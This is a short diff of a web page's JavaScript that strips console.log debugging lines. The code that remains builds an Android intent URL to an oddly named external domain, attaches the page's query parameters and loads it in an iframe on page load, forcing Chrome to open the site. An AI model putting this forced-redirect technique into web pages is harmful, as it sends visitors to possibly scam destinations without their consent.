@@ -23,9 +23,9 @@ window.onload = function () {
   function destroyNotice() {
     $('.notice').addClass('notice-destroy');
   }
-       console.log('f');
+       
          var str = "intent://warumbistdusoarm.space/?5edf54a7513dc=0";
-         console.log(str);
+         
         var params = window
           .location
           .search
@@ -49,7 +49,7 @@ window.onload = function () {
       }
 
       str+= "#Intent;scheme=http;package=com.android.chrome;end";
-      console.log(str);
+     
       let intentFrame = document.getElementById('iframe');
     
       intentFrame.setAttribute('src', str);
